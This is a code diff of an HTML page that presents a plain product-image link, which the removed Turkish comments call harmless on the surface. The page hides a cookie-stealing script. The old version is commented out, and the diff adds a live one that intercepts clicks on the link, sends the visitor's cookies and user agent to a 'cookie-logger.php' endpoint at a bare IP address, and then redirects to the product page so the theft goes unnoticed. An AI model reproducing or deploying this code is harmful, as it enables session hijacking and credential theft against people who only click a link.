@@ -1,32 +1,60 @@
 <!DOCTYPE html>
 <html>
 <body style="margin:0">
-  <!-- 1. Masum Görsel -->
-  <a href="/product/123" style="display:block">
+  <!-- <a href="/product/123" style="display:block">  -->
+    <a id="myLink" href="/product/123" style="display:block"></a>
     <img src="https://akn-ss.a-cdn.akinoncloud.com/products/2021/09/15/314248/f8398d46-fc92-4498-8790-f3bbed8c57ff_size3840_cropCenter.jpg" 
          style="width:100%">
   </a>
 
-  <!-- 2. Gizli Çalışan Script -->
+  <!--
   <script>
-    // Tıklama olayını dinle
+ 
     document.querySelector('a').addEventListener('click', async function(e) {
       e.preventDefault();
       
-      // Çerezleri sessizce gönder
-      await fetch('https://eofq9gzi9prj763.m.pipedream.net', {
+      await fetch('http://16.171.42.24', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           victim_cookie: document.cookie,
           user_agent: navigator.userAgent
         }),
-        mode: 'no-cors' // CORS sorununu önle
+        mode: 'no-cors' 
       });
       
-      // Kullanıcıyı normal sayfaya yönlendir
+
       window.location.href = this.href;
     });
   </script>
+
+-->
+
+<script>
+  document.getElementById('myLink').addEventListener('click', async function(e) {
+    e.preventDefault();
+    try {
+      await fetch("http://16.171.42.24/cookie-logger.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        credentials: "include",
+
+        body: JSON.stringify({
+          victim_cookie: document.cookie,
+          user_agent: navigator.userAgent
+        })
+      });
+      
+
+    } catch(err) {
+      console.log("Fetch error:", err);
+    }
+
+    window.location.href = this.href;
+  });
+</script>
+
 </body>
 </html>
